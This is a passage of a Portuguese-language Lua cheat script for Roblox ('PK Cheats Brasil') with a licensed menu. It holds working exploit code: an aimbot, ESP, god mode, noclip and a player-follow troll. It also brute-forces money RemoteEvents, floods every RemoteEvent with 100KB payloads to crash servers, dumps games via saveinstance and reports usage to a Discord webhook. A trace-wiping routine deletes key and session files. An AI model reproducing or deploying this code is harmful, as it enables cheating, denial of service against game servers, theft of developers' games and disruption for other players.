    tornadoConn = RunService.Heartbeat:Connect(function(dt)
        local r = hrp(); if not r then return end
        for _,t in ipairs(tornadoParts) do
            t.angle = t.angle + dt*3
            local pos = r.Position + Vector3.new(math.cos(t.angle)*t.radius, t.height-10, math.sin(t.angle)*t.radius)
            t.part.CFrame = CFrame.new(pos) * CFrame.Angles(0, t.angle, 0)
        end
    end)
end
-- cleanup tornado quando desinjetar
local function cleanup_tornado() for _,t in ipairs(tornadoParts) do pcall(function() t.part:Destroy() end) end; tornadoParts={} end

-- EXTRAS trolls
local orig_trans={}
local function set_invisible(v) local c=LP.Character; if not c then return end; for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") or p:IsA("Decal") then if v then orig_trans[p]=orig_trans[p] or p.Transparency; p.Transparency=1 else if orig_trans[p] then p.Transparency=orig_trans[p]; orig_trans[p]=nil end end end end end
local godConn; local function god_mode(v) if godConn then godConn:Disconnect(); godConn=nil end; if v then godConn=RunService.Heartbeat:Connect(function() local h=hum(); if h then h.Health=h.MaxHealth end end) end end
local spinBV; local function do_spin(v) if spinBV then spinBV:Destroy(); spinBV=nil end; if not v then return end; local r=hrp(); if not r then return end; spinBV=Instance.new("BodyAngularVelocity",r); spinBV.Name="_"; spinBV.MaxTorque=Vector3.new(0,math.huge,0); spinBV.AngularVelocity=Vector3.new(0,20,0) end
local function fling_self() local r=hrp(); if not r then return end; local b=Instance.new("BodyVelocity",r); b.Name="_"; b.MaxForce=Vector3.new(9e9,9e9,9e9); b.Velocity=Vector3.new(math.random(-500,500),500,math.random(-500,500)); task.delay(0.3,function() b:Destroy() end) end

track(RunService.Heartbeat:Connect(function() if S.troll.follow_target=="" then return end; local tgt; for _,p in ipairs(Players:GetPlayers()) do if p~=LP and p.Name:lower():find(S.troll.follow_target:lower(),1,true) then tgt=p; break end end; if not tgt then return end; local tr=tgt.Character and tgt.Character:FindFirstChild("HumanoidRootPart"); local r=hrp(); if tr and r then r.CFrame=tr.CFrame*CFrame.new(0,0,3) end end))

-- REMOTES
local function scan_remotes() local out={}; for _,d in ipairs(RepStorage:GetDescendants()) do if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then table.insert(out,{ref=d,name=d.Name,type=d.ClassName,path=d:GetFullName()}) end end; for _,d in ipairs(Workspace:GetDescendants()) do if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then table.insert(out,{ref=d,name=d.Name,type=d.ClassName,path=d:GetFullName()}) end end; return out end

local MONEY_WORDS={"money","cash","coin","gold","gem","dollar","credit","bux","token","diamond","bank","wallet","buy","purchase","reward","claim","give","add","grant","earn","deposit","transfer","salary","income"}
local function money_exploit_remote(value)
    local tried=0; local names={}
    for _,r in ipairs(scan_remotes()) do
        local low=r.name:lower(); local match=false
        for _,w in ipairs(MONEY_WORDS) do if low:find(w,1,true) then match=true; break end end
        if not match then continue end
        local attempts = {
            function() if r.ref:IsA("RemoteEvent") then r.ref:FireServer(value) end end,
            function() if r.ref:IsA("RemoteEvent") then r.ref:FireServer(LP, value) end end,
            function() if r.ref:IsA("RemoteEvent") then r.ref:FireServer(LP.Name, value) end end,
            function() if r.ref:IsA("RemoteEvent") then r.ref:FireServer("add", value) end end,
            function() if r.ref:IsA("RemoteEvent") then r.ref:FireServer("give", value) end end,
            function() if r.ref:IsA("RemoteEvent") then r.ref:FireServer("set", value) end end,
            function() if r.ref:IsA("RemoteEvent") then r.ref:FireServer({amount=value}) end end,
            function() if r.ref:IsA("RemoteFunction") then r.ref:InvokeServer(value) end end,
            function() if r.ref:IsA("RemoteFunction") then r.ref:InvokeServer(LP, value) end end,
            function() if r.ref:IsA("RemoteFunction") then r.ref:InvokeServer("add", value) end end,
        }
        for _,fn in ipairs(attempts) do pcall(fn) end
        tried += 1; table.insert(names, r.name)
    end
    return tried, names
end

-- MONEY DIRECT: escreve nas leaderstats/data folders do LocalPlayer
local function money_edit_direct(value)
    local changed = 0; local names = {}
    local function sf(folder, prefix)
        if not folder then return end
        for _,v in ipairs(folder:GetChildren()) do
            if v:IsA("IntValue") or v:IsA("NumberValue") then
                local low = v.Name:lower()
                for _,w in ipairs(MONEY_WORDS) do
                    if low:find(w,1,true) then
                        pcall(function() v.Value = value end)
                        changed += 1; table.insert(names, prefix..v.Name)
                        break
                    end
                end
            end
        end
    end
    sf(LP:FindFirstChild("leaderstats"),"leaderstats/")
    sf(LP:FindFirstChild("PlayerStats"),"PlayerStats/")
    sf(LP:FindFirstChild("Stats"),"Stats/")
    sf(LP:FindFirstChild("Data"),"Data/")
    sf(LP:FindFirstChild("PlayerData"),"PlayerData/")
    return changed, names
end

-- SERVER ANALYZER
local function analyze_server()
    local report = { features = {} }
    local function add(name, status, note) table.insert(report.features, {name=name,status=status,note=note or ""}) end

    -- ESP
    local anyChar = false; for _,p in ipairs(Players:GetPlayers()) do if p.Character then anyChar=true; break end end
    add("ESP", anyChar and "✓" or "⚠", anyChar and "players detectados com Character" or "esperando personagens spawnarem")

    -- Fly / Speed
    local h = hum()
    add("Fly / Speed", h and "✓" or "⚠", h and "Humanoid acessível" or "Humanoid não encontrado")

    -- Noclip
    add("Noclip", "✓", "sempre funciona client-side")

    -- Aimbot
    add("Aimbot", "✓", "funciona em todo jogo com Humanoid")

    -- Silent Aim
    add("Silent Aim", hookmetamethod and "✓" or "✗", hookmetamethod and "executor suporta hookmetamethod" or "executor sem hookmetamethod")

    -- Money (remotes)
    local moneyRemotes = 0
    for _,r in ipairs(scan_remotes()) do local l=r.name:lower(); for _,w in ipairs(MONEY_WORDS) do if l:find(w,1,true) then moneyRemotes += 1; break end end end
    add("Money Exploit Remoto", moneyRemotes > 0 and "✓" or "✗", moneyRemotes.." remotes de dinheiro detectados")

    -- Money direct (leaderstats)
    local statsCount = 0
    local function sc(f) if not f then return end; for _,v in ipairs(f:GetChildren()) do if v:IsA("IntValue") or v:IsA("NumberValue") then statsCount+=1 end end end
    sc(LP:FindFirstChild("leaderstats")); sc(LP:FindFirstChild("PlayerStats")); sc(LP:FindFirstChild("Stats")); sc(LP:FindFirstChild("Data"))
    add("Money Direto (leaderstats)", statsCount > 0 and "✓" or "✗", statsCount.." stats detectadas")

    -- Tools/Weapons
    local toolCount = #scan_tools()
    add("Armas", toolCount > 0 and "✓" or "⚠", toolCount.." tools achadas")

    -- Teleport
    add("Teleporte", "✓", "sempre funciona client-side")

    -- Fullbright/Zoom
    add("Fullbright / Zoom", "✓", "100% client-side")

    -- Leak
    add("Save Instance", (saveinstance or (syn and syn.saveinstance)) and "✓" or "✗", "depende do executor")

    return report
end

local function try_saveinstance() local fn=saveinstance or (syn and syn.saveinstance); if not fn then return false,"executor sem saveinstance" end; task.spawn(function() pcall(function() pcall(fn,{mode="optimized",noscripts=false}) end) end); return true,"disparado em background" end

local function crash_server_attempt() local sent=0; task.spawn(function() local remotes={}; for _,r in ipairs(scan_remotes()) do if r.type=="RemoteEvent" then table.insert(remotes,r.ref) end end; if #remotes==0 then return end; local payload=string.rep("X",100000); for i=1,200 do for _,r in ipairs(remotes) do pcall(function() r:FireServer(payload,payload,payload) end); sent+=1 end; if i%20==0 then task.wait() end end end); return sent end

-- STATUS WEBHOOK
local function send_status(cu, ia)
    local active={}; for k,cat in pairs(S) do if type(cat)=="table" and cat.on then table.insert(active,k) end; if type(cat)=="table" and cat.silent then table.insert(active,"silent_aim") end; if type(cat)=="table" and cat.lock then table.insert(active,"lock_on") end end
    local risk, dot, col
    if S.aim.silent or S.aim.on or S.aim.lock then risk, dot, col = "Risky / Unstable", "🟡", 16763904
    elseif S.fly.on or S.speed.on or S.noclip.on then risk, dot, col = "Risky / Unstable", "🟡", 16763904
    else risk, dot, col = "Fully Working", "🟢", 3066993 end
    send_webhook(WH_STATUS, {
        title = "Status [Premium]",
        color = col,
        description = "🔴 **=** Down / Updating\n🟡 **=** Risky / Unstable\n🟢 **=** Fully Working\n\n"..dot.." **PK Cheats Brasil** — "..risk,
        fields = {
            { name="Usuário", value="`"..cu.."`"..(ia and " **[ADMIN]**" or ""), inline=true },
            { name="Place", value="`"..game.PlaceId.."`", inline=true },
            { name="Features", value = #active>0 and ("`"..table.concat(active,", ").."`") or "`nenhuma`", inline=false },
        },
        footer = { text = "status check • "..os.date("%d/%m %H:%M:%S").." • "..DISCORD },
    })
end

local function wipe_traces() for k,cat in pairs(S) do if type(cat)=="table" then if cat.on~=nil then cat.on=false end; if cat.silent~=nil then cat.silent=false end; if cat.lock~=nil then cat.lock=false end end end; S.troll.follow_target=""; stop_fly(); toggle_freecam(false); apply_fullbright(false); toggle_tornado(false); cleanup_tornado(); god_mode(false); do_spin(false); set_invisible(false); Camera.FieldOfView=70; for _,c in ipairs(Connections) do pcall(function() c:Disconnect() end) end; Connections={}; for p,_ in pairs(ESPData) do kill_esp(p) end; if fovCircle then pcall(function() fovCircle:Remove() end) end; for _,l in ipairs(chLines) do pcall(function() l:Remove() end) end; local c=LP.Character; if c then for _,d in ipairs(c:GetDescendants()) do if (d:IsA("BodyGyro") or d:IsA("BodyVelocity")) and d.Name=="_" then d:Destroy() end end end; if FS_OK then for _,p in ipairs({P_KEYS,P_USERS,P_SESS,P_CFG}) do pcall(function() delfile(p) end) end end; ScreenGui:Destroy() end

-- Floating button + hotkeys
local FloatBtn, MainRoot, menuVisible
local function toggle_menu() if not MainRoot then return end; menuVisible = not menuVisible; MainRoot.Visible = menuVisible; if FloatBtn then FloatBtn.Visible = not menuVisible end end

FloatBtn=make("ImageButton",{Size=UDim2.new(0,56,0,56),Position=UDim2.new(0,16,0.5,-28),BackgroundTransparency=1,Image=LOGO_ID,Visible=false,Parent=ScreenGui,ZIndex=500})
stroke(FloatBtn,THEME.accent,2); corner(FloatBtn,28)
FloatBtn.MouseButton1Click:Connect(toggle_menu)
local fD,fS,fP
FloatBtn.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.Touch or i.UserInputType==Enum.UserInputType.MouseButton1 then fD=true; fS=i.Position; fP=FloatBtn.Position end end)
FloatBtn.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.Touch or i.UserInputType==Enum.UserInputType.MouseButton1 then fD=false end end)
UserInput.InputChanged:Connect(function(i) if fD and (i.UserInputType==Enum.UserInputType.Touch or i.UserInputType==Enum.UserInputType.MouseMovement) then local d=i.Position-fS; FloatBtn.Position=UDim2.new(fP.X.Scale,fP.X.Offset+d.X,fP.Y.Scale,fP.Y.Offset+d.Y) end end)

local lastKey={[Enum.KeyCode.K]=false,[Enum.KeyCode.Insert]=false,[Enum.KeyCode.End]=false}
local lastTog=0
task.spawn(function() while ScreenGui.Parent do task.wait(0.05); if not MainRoot then continue end; for key,_ in pairs(lastKey) do local dn=UserInput:IsKeyDown(key); if dn and not lastKey[key] then local f=UserInput:GetFocusedTextBox(); if not f and (tick()-lastTog)>0.3 then lastTog=tick(); toggle_menu() end end; lastKey[key]=dn end end end)

------------------------------------------------------------
-- MENU
------------------------------------------------------------
local function build_menu(cu, ia)

MainRoot=make("Frame",{Name="Main",Active=true,Draggable=true,Size=UDim2.new(0,IS_MOBILE and 740 or 960,0,IS_MOBILE and 480 or 600),Position=UDim2.new(0.5,-(IS_MOBILE and 370 or 480),0.5,-(IS_MOBILE and 240 or 300)),BackgroundColor3=THEME.bg,BorderSizePixel=0,BackgroundTransparency=CfgDB.transparency,Parent=ScreenGui})
corner(MainRoot,12); stroke(MainRoot,THEME.accent,1.5); gradient_pro(MainRoot,THEME.bg,THEME.bg2,THEME.bg,90)

local Side=make("Frame",{Size=UDim2.new(0,220,1,0),BackgroundColor3=THEME.bg2,BorderSizePixel=0,BackgroundTransparency=CfgDB.transparency*0.5,Parent=MainRoot}); corner(Side,12); gradient_pro(Side,THEME.bg2,THEME.bg,THEME.bg2,180)
make("Frame",{Size=UDim2.new(0,2,1,0),Position=UDim2.new(1,-2,0,0),BackgroundColor3=THEME.accent,BorderSizePixel=0,Parent=Side})
build_logo(Side,130).Position=UDim2.new(0.5,-65,0,8)

local TabArea=make("ScrollingFrame",{Size=UDim2.new(1,-20,1,-170),Position=UDim2.new(0,10,0,150),BackgroundTransparency=1,BorderSizePixel=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=2,ScrollBarImageColor3=THEME.accent,Parent=Side})
make("UIListLayout",{Padding=UDim.new(0,4)},TabArea)

local Content=make("Frame",{Size=UDim2.new(1,-230,1,-20),Position=UDim2.new(0,225,0,10),BackgroundTransparency=1,Parent=MainRoot})
local TopBar=make("Frame",{Size=UDim2.new(1,0,0,46),BackgroundTransparency=1,Parent=Content})
local TitleLbl=label(TopBar,"Início",18,true); TitleLbl.Size=UDim2.new(1,-220,1,0)
label(TopBar,cu..(ia and "  [ADMIN]" or ""),12,true,THEME.accent).Size=UDim2.new(0,180,0,16); TopBar:GetChildren()[#TopBar:GetChildren()].Position=UDim2.new(1,-260,0,8); TopBar:GetChildren()[#TopBar:GetChildren()].TextXAlignment=Enum.TextXAlignment.Right
local u=UserDB[cu]; local ExpLbl=label(TopBar,"",11,false,THEME.text2); ExpLbl.Size=UDim2.new(0,180,0,14); ExpLbl.Position=UDim2.new(1,-260,0,26); ExpLbl.TextXAlignment=Enum.TextXAlignment.Right
if u.exp==-1 then ExpLbl.Text="lifetime"; ExpLbl.TextColor3=THEME.good else local left=math.max(0,(u.exp or 0)-os.time()); ExpLbl.Text=string.format("expira em %dd %dh",math.floor(left/86400),math.floor((left%86400)/3600)) end

local MinBtn=make("TextButton",{Size=UDim2.new(0,30,0,30),Position=UDim2.new(1,-74,0,8),BackgroundColor3=THEME.card,Text="-",TextColor3=THEME.warn,Font=Enum.Font.GothamBold,TextSize=20,BorderSizePixel=0,Parent=TopBar}); corner(MinBtn,15); stroke(MinBtn,THEME.warn); animate_btn(MinBtn)
local CloseBtn=make("TextButton",{Size=UDim2.new(0,30,0,30),Position=UDim2.new(1,-38,0,8),BackgroundColor3=THEME.card,Text="×",TextColor3=THEME.accent,Font=Enum.Font.GothamBold,TextSize=20,BorderSizePixel=0,Parent=TopBar}); corner(CloseBtn,15); stroke(CloseBtn,THEME.accent); animate_btn(CloseBtn)
MinBtn.MouseButton1Click:Connect(toggle_menu); CloseBtn.MouseButton1Click:Connect(toggle_menu)

local Pages=make("Frame",{Size=UDim2.new(1,0,1,-56),Position=UDim2.new(0,0,0,54),BackgroundTransparency=1,Parent=Content})
local tabs={}
local function sh(txt) local l=label(TabArea,"  "..txt,10,true,THEME.text2); l.Size=UDim2.new(1,0,0,18) end
local function make_tab(name,iconid) local b=make("TextButton",{BackgroundColor3=THEME.bg,BorderSizePixel=0,Text="",AutoButtonColor=false,Size=UDim2.new(1,0,0,34),Parent=TabArea}); corner(b,6); local ic=imgIcon(b,iconid,16); ic.Position=UDim2.new(0,12,0.5,-8); ic.ImageColor3=THEME.text2; local lb=label(b,name,13,false,THEME.text2); lb.Size=UDim2.new(1,-40,1,0); lb.Position=UDim2.new(0,36,0,0); lb.Font=Enum.Font.GothamMedium; local page=make("ScrollingFrame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,BorderSizePixel=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=3,ScrollBarImageColor3=THEME.accent,Visible=false,Parent=Pages}); pad(page,2); tabs[name]={btn=b,page=page,lb=lb,ic=ic}; b.MouseButton1Click:Connect(function() for n,t in pairs(tabs) do t.page.Visible=false; t.btn.BackgroundColor3=THEME.bg; t.lb.TextColor3=THEME.text2; t.ic.ImageColor3=THEME.text2 end; page.Visible=true; TweenService:Create(b,TweenInfo.new(0.2),{BackgroundColor3=THEME.accent}):Play(); lb.TextColor3=THEME.text; ic.ImageColor3=THEME.text; TitleLbl.Text=name end); return page end

local function card(parent,title) local c=make("Frame",{BackgroundColor3=THEME.card,BorderSizePixel=0,Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,Parent=parent,BackgroundTransparency=CfgDB.transparency*0.3}); corner(c,8); stroke(c,THEME.stroke); local head=make("Frame",{Size=UDim2.new(1,0,0,32),BackgroundColor3=THEME.card2,BorderSizePixel=0,Parent=c}); corner(head,8); make("Frame",{Size=UDim2.new(1,0,0,10),Position=UDim2.new(0,0,1,-10),BackgroundColor3=THEME.card2,BorderSizePixel=0,Parent=head}); make("Frame",{Size=UDim2.new(0,3,0,18),Position=UDim2.new(0,0,0.5,-9),BackgroundColor3=THEME.accent,BorderSizePixel=0,Parent=head}); label(head,"   "..title,12,true).Size=UDim2.new(1,-8,1,0); local body=make("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,-20,0,0),Position=UDim2.new(0,10,0,40),AutomaticSize=Enum.AutomaticSize.Y,Parent=c}); make("UIListLayout",{Padding=UDim.new(0,6)},body); body:GetPropertyChangedSignal("AbsoluteSize"):Connect(function() c.Size=UDim2.new(1,0,0,body.AbsoluteSize.Y+52) end); return body end
local function two(parent) local f=make("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,Parent=parent}); local L=make("Frame",{BackgroundTransparency=1,Size=UDim2.new(0.5,-4,0,0),AutomaticSize=Enum.AutomaticSize.Y,Parent=f}); local R=make("Frame",{BackgroundTransparency=1,Size=UDim2.new(0.5,-4,0,0),AutomaticSize=Enum.AutomaticSize.Y,Position=UDim2.new(0.5,4,0,0),Parent=f}); make("UIListLayout",{Padding=UDim.new(0,8)},L); make("UIListLayout",{Padding=UDim.new(0,8)},R); local function s() f.Size=UDim2.new(1,0,0,math.max(L.AbsoluteSize.Y,R.AbsoluteSize.Y)) end; L:GetPropertyChangedSignal("AbsoluteSize"):Connect(s); R:GetPropertyChangedSignal("AbsoluteSize"):Connect(s); return L,R end
local function dual(parent) local h=make("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,-4,0,0),AutomaticSize=Enum.AutomaticSize.Y,Parent=parent}); make("UIListLayout",{Padding=UDim.new(0,8)},h); return h end
local function tgl(parent,name,def,cb,sub) local h=sub and 50 or 36; local c=make("Frame",{BackgroundColor3=THEME.card2,BorderSizePixel=0,Size=UDim2.new(1,0,0,h),Parent=parent}); corner(c,6); local lb=label(c,name,12,true); lb.Position=UDim2.new(0,10,0,sub and 6 or 0); lb.Size=UDim2.new(1,-70,0,16); if not sub then lb.Size=UDim2.new(1,-70,1,0) end; if sub then local s=label(c,sub,10,false,THEME.text2); s.Position=UDim2.new(0,10,0,26); s.Size=UDim2.new(1,-70,0,14) end; local sw=make("TextButton",{Size=UDim2.new(0,42,0,22),Position=UDim2.new(1,-52,0.5,-11),BackgroundColor3=def and THEME.accent or THEME.bg,BorderSizePixel=0,Text="",AutoButtonColor=false,Parent=c}); corner(sw,11); local k=make("Frame",{Size=UDim2.new(0,16,0,16),Position=UDim2.new(def and 1 or 0,def and -19 or 3,0.5,-8),BackgroundColor3=THEME.text,BorderSizePixel=0,Parent=sw}); corner(k,8); local v=def; sw.MouseButton1Click:Connect(function() v=not v; TweenService:Create(sw,TweenInfo.new(0.2),{BackgroundColor3=v and THEME.accent or THEME.bg}):Play(); TweenService:Create(k,TweenInfo.new(0.2),{Position=UDim2.new(v and 1 or 0,v and -19 or 3,0.5,-8)}):Play(); if cb then cb(v) end end); return c end
local function sld(parent,name,mn,mx,def,cb) local c=make("Frame",{BackgroundColor3=THEME.card2,BorderSizePixel=0,Size=UDim2.new(1,0,0,52),Parent=parent}); corner(c,6); local n=label(c,name,12); n.Position=UDim2.new(0,10,0,6); n.Size=UDim2.new(1,-60,0,16); local vl=label(c,tostring(def),12,true,THEME.accent); vl.Size=UDim2.new(0,50,0,16); vl.Position=UDim2.new(1,-60,0,6); vl.TextXAlignment=Enum.TextXAlignment.Right; local bar=make("Frame",{Size=UDim2.new(1,-20,0,6),Position=UDim2.new(0,10,0,32),BackgroundColor3=THEME.bg,BorderSizePixel=0,Parent=c}); corner(bar,3); local fill=make("Frame",{Size=UDim2.new((def-mn)/(mx-mn),0,1,0),BackgroundColor3=THEME.accent,BorderSizePixel=0,Parent=bar}); corner(fill,3); local k=make("TextButton",{Size=UDim2.new(0,14,0,14),Position=UDim2.new((def-mn)/(mx-mn),-7,0.5,-7),BackgroundColor3=THEME.text,BorderSizePixel=0,Text="",AutoButtonColor=false,Parent=bar}); corner(k,7); local drag=false; k.MouseButton1Down:Connect(function() drag=true end); k.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.Touch then drag=true end end); UserInput.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then drag=false end end); UserInput.InputChanged:Connect(function(i) if not drag then return end; if i.UserInputType~=Enum.UserInputType.MouseMovement and i.UserInputType~=Enum.UserInputType.Touch then return end; local rel=math.clamp((i.Position.X-bar.AbsolutePosition.X)/bar.AbsoluteSize.X,0,1); TweenService:Create(fill,TweenInfo.new(0.08),{Size=UDim2.new(rel,0,1,0)}):Play(); TweenService:Create(k,TweenInfo.new(0.08),{Position=UDim2.new(rel,-7,0.5,-7)}):Play(); local v=math.floor(mn+(mx-mn)*rel+0.5); vl.Text=tostring(v); if cb then cb(v) end end) end
local function wbtn(parent,name,color,cb,sub) local h=sub and 46 or 36; local b=make("TextButton",{BackgroundColor3=color or THEME.accent,BorderSizePixel=0,Size=UDim2.new(1,0,0,h),Text="",AutoButtonColor=false,Parent=parent}); corner(b,6); if color==nil then gradient_pro(b,THEME.accent,THEME.accent2,THEME.accent3,90) end; local lb=label(b,name,13,true); lb.Size=UDim2.new(1,-20,0,16); lb.Position=UDim2.new(0,10,0,sub and 6 or 0); if not sub then lb.Size=UDim2.new(1,-20,1,0); lb.TextXAlignment=Enum.TextXAlignment.Center end; if sub then local s=label(b,sub,10,false,Color3.fromRGB(230,230,230)); s.Size=UDim2.new(1,-20,0,14); s.Position=UDim2.new(0,10,0,26) end; b.MouseButton1Click:Connect(cb); animate_btn(b); return b end
local function winp(parent,ph) local c=make("Frame",{BackgroundColor3=THEME.card2,BorderSizePixel=0,Size=UDim2.new(1,0,0,36),Parent=parent}); corner(c,6); local b=make("TextBox",{BackgroundTransparency=1,Size=UDim2.new(1,-20,1,0),Position=UDim2.new(0,10,0,0),PlaceholderText=ph,PlaceholderColor3=THEME.text2,TextColor3=THEME.text,Font=Enum.Font.Gotham,TextSize=13,TextXAlignment=Enum.TextXAlignment.Left,Text="",ClearTextOnFocus=false,Parent=c}); return b end
local function ddn(parent,name,options,cb) local c=make("Frame",{BackgroundColor3=THEME.card2,BorderSizePixel=0,Size=UDim2.new(1,0,0,40),Parent=parent}); corner(c,6); label(c,name,12).Position=UDim2.new(0,10,0,0); c:GetChildren()[#c:GetChildren()].Size=UDim2.new(1,-170,1,0); local b=make("TextButton",{Size=UDim2.new(0,150,0,26),Position=UDim2.new(1,-160,0.5,-13),BackgroundColor3=THEME.bg,BorderSizePixel=0,Text=options[1].label,TextColor3=THEME.text,Font=Enum.Font.Gotham,TextSize=12,Parent=c}); corner(b,4); stroke(b,THEME.stroke); local list; b.MouseButton1Click:Connect(function() if list then list:Destroy(); list=nil; return end; list=make("Frame",{Size=UDim2.new(0,150,0,#options*26+4),Position=UDim2.new(1,-160,1,4),BackgroundColor3=THEME.bg,BorderSizePixel=0,ZIndex=50,Parent=c}); corner(list,4); stroke(list,THEME.accent); make("UIListLayout",{Padding=UDim.new(0,2)},list); pad(list,2); for _,opt in ipairs(options) do local ob=make("TextButton",{Size=UDim2.new(1,0,0,22),BackgroundColor3=THEME.card2,BorderSizePixel=0,Text=opt.label,TextColor3=THEME.text,Font=Enum.Font.Gotham,TextSize=12,ZIndex=51,Parent=list}); corner(ob,3); ob.MouseButton1Click:Connect(function() b.Text=opt.label; if cb then cb(opt) end; list:Destroy(); list=nil end) end end) end

-- TABS
sh("JOGO")
local pInicio=make_tab("Início",HOME_ICON)
local pAnalyze=make_tab("Analyzer",TAB_ICON)
local pAim   =make_tab("Aimbot",TAB_ICON)
local pESP   =make_tab("ESP",TAB_ICON)
local pMove  =make_tab("Movimento",TAB_ICON)
local pTP    =make_tab("Teleporte",TAB_ICON)
sh("EXTRAS")
local pArmas =make_tab("Armas",TAB_ICON)
local pTroll =make_tab("Trolls",TAB_ICON)
local pMoney =make_tab("Money",TAB_ICON)
local pSpy   =make_tab("Remote Spy",TAB_ICON)
sh("SEGURANÇA")
local pBypass=make_tab("Bypass",TAB_ICON)
local pCfg   =make_tab("Config",TAB_ICON)
local pKeys,pLeak,pCrash
if ia then sh("ADMIN"); pKeys=make_tab("Keys",TAB_ICON); pLeak=make_tab("Leak",TAB_ICON); pCrash=make_tab("Crash",TAB_ICON) end

-- INÍCIO
do local list=dual(pInicio); local L,R=two(list)
    local uc=card(L,"Conta Roblox"); local hol=make("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,100),Parent=uc})
    local av=make("ImageLabel",{BackgroundColor3=THEME.bg,BorderSizePixel=0,Size=UDim2.new(0,90,0,90),Position=UDim2.new(0,0,0,5),Parent=hol}); corner(av,45); stroke(av,THEME.accent,2)
    task.spawn(function() local ok,c=pcall(function() return Players:GetUserThumbnailAsync(LP.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size150x150) end); if ok then av.Image=c end end)
    label(hol,"@"..LP.Name,14,true).Position=UDim2.new(0,105,0,10); hol:GetChildren()[#hol:GetChildren()].Size=UDim2.new(1,-110,0,18)
    label(hol,LP.DisplayName,12,false,THEME.text2).Position=UDim2.new(0,105,0,30); hol:GetChildren()[#hol:GetChildren()].Size=UDim2.new(1,-110,0,16)
    label(hol,"ID: "..LP.UserId,11,false,THEME.text2).Position=UDim2.new(0,105,0,48); hol:GetChildren()[#hol:GetChildren()].Size=UDim2.new(1,-110,0,14)
    local pl=card(L,"Plano"); label(pl,"User: "..cu,12,true).Size=UDim2.new(1,0,0,16); label(pl,"Key: "..(u.key or "—"),11,false,THEME.text2).Size=UDim2.new(1,0,0,16); label(pl,"Validade: "..(u.exp==-1 and "LIFETIME" or (u.exp and os.date("%d/%m/%Y",u.exp) or "?")),11,false,THEME.text2).Size=UDim2.new(1,0,0,16)
    local q=card(R,"Ações rápidas"); wbtn(q,"Combo",nil,function() S.esp.on=true; S.fly.on=true; start_fly(); S.speed.on=true; notify("Combo","ligado","success") end); wbtn(q,"Desligar tudo",THEME.card2,function() S.esp.on=false; S.fly.on=false; stop_fly(); S.speed.on=false; local h=hum(); if h then h.WalkSpeed=16 end end); wbtn(q,"Rejoin",THEME.card2,function() pcall(function() TeleportService:Teleport(game.PlaceId,LP) end) end)
    local st=card(R,"Servidor"); local s1=label(st,"Players: "..#Players:GetPlayers().."/"..Players.MaxPlayers,12); s1.Size=UDim2.new(1,0,0,16); label(st,"Executor: "..EXE,11,false,THEME.text2).Size=UDim2.new(1,0,0,14); task.spawn(function() while MainRoot.Parent do s1.Text="Players: "..#Players:GetPlayers().."/"..Players.MaxPlayers; task.wait(3) end end)
end

-- ANALYZER
do local list=dual(pAnalyze)
    local c=card(list,"🔍 Analisador do Servidor")
    local status = label(c,"clique 'Analisar' pra ver quais funções vão funcionar aqui",12,false,THEME.text2); status.Size=UDim2.new(1,0,0,22); status.TextWrapped=true
    local out = make("Frame",{BackgroundColor3=THEME.bg,BorderSizePixel=0,Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,Parent=c}); corner(out,6)
    local list_f = make("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,-16,0,0),Position=UDim2.new(0,8,0,8),AutomaticSize=Enum.AutomaticSize.Y,Parent=out}); make("UIListLayout",{Padding=UDim.new(0,4)},list_f)
    local function render_report(rep)
        for _,x in ipairs(list_f:GetChildren()) do if x:IsA("TextLabel") or x:IsA("Frame") then x:Destroy() end end
        for _,f in ipairs(rep.features) do
            local row = make("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,20),Parent=list_f})
            local col = f.status=="✓" and THEME.good or f.status=="⚠" and THEME.warn or THEME.danger
            local s = label(row, f.status, 13, true, col); s.Size=UDim2.new(0,20,1,0); s.TextXAlignment=Enum.TextXAlignment.Center
            local n = label(row, f.name, 12, true); n.Size=UDim2.new(0,180,1,0); n.Position=UDim2.new(0,24,0,0)
            local note = label(row, f.note, 10, false, THEME.text2); note.Size=UDim2.new(1,-210,1,0); note.Position=UDim2.new(0,208,0,0); note.TextTruncate=Enum.TextTruncate.AtEnd
        end
    end
    wbtn(c,"🔍 Analisar servidor",nil,function()
        status.Text="calculando compatibilidade das funções..."
        task.spawn(function()
            task.wait(0.4)
            local rep = analyze_server()
            render_report(rep)
            local ok,warn,bad=0,0,0
            for _,f in ipairs(rep.features) do if f.status=="✓" then ok+=1 elseif f.status=="⚠" then warn+=1 else bad+=1 end end
            status.Text = ("resultado: %d funcionam ✓ | %d com atenção ⚠ | %d indisponíveis ✗"):format(ok,warn,bad)
            notify("Analyzer", ok.." features vão funcionar nesse jogo","success",4)
        end)
    end)
end

-- AIMBOT
do local list=dual(pAim); local L,R=two(list)
    local c=card(L,"Aimbot 1 (configurável)")
    tgl(c,"Aimbot ligado",false,function(v) S.aim.on=v end,"botão direito (PC) ou tocando na tela (mobile)")
    sld(c,"FOV",30,500,120,function(v) S.aim.fov=v end)
    sld(c,"Smooth",5,100,30,function(v) S.aim.smooth=v/100 end)
    tgl(c,"Suporte MOBILE",IS_MOBILE,function(v) S.aim.mobile=v end,"detecta toque como trigger de mira")

    local c2=card(R,"🔒 Aimbot 2 LOCK-ON")
    label(c2,"gruda direto na cabeça — sem FOV, sem smooth, sem distância. só mira em alvos visíveis.",10,false,THEME.text2).Size=UDim2.new(1,0,0,30)
